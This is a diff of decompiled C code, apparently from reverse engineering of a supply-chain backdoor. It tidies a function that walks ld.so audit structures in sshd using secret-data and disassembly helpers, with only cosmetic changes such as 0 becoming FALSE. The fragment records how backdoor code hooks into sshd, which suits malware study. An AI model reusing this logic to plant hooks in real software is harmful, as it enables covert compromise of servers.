@@ -41,7 +41,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
   _func_47 *decrypt_stub;
   _func_18 *libc_getuid_stub;
   u8 *matched_field;
-  _union_77 local_70;
+  _union_78 local_70;
   byte local_60;
   uint local_58;
   _func_18 *local_50;
@@ -49,7 +49,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
   
   bVar16 = 0;
   BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
-  if (BVar6 != 0) {
+  if (BVar6 != FALSE) {
     code_start = search_ctx->start_addr;
     pp_Var14 = &libc_getuid_stub;
     for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
@@ -76,8 +76,8 @@ BOOL find_link_map_l_audit_any_plt_bitmask
     bVar16 = 0xff;
     for (; code_start < search_ctx->end_addr; code_start = code_start + (long)matched_field) {
       BVar6 = x86_dasm((dasm_ctx_t *)&libc_getuid_stub,code_start,search_ctx->end_addr);
-      if (BVar6 == 0) {
-        return 0;
+      if (BVar6 == FALSE) {
+        return FALSE;
       }
       if (iVar15 == 0) {
         if (((local_58 == 0x1036) && (((ushort)local_70._0_4_ & 0x140) == 0x140)) &&
@@ -204,11 +204,11 @@ LAB_00104da9:
             (pbVar4->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = plVar10;
             (pbVar4->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_40;
             if ((plVar10->_opaque & local_40) == 0) {
-              return 1;
+              return TRUE;
             }
           }
-          search_ctx->result = 1;
-          return 0;
+          search_ctx->result = TRUE;
+          return FALSE;
         }
       }
 LAB_00104e97:
@@ -217,6 +217,6 @@ LAB_00104e97:
     lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
     lzma_free(plVar2->getuid,allocator_00);
   }
-  return 0;
+  return FALSE;
 }
 
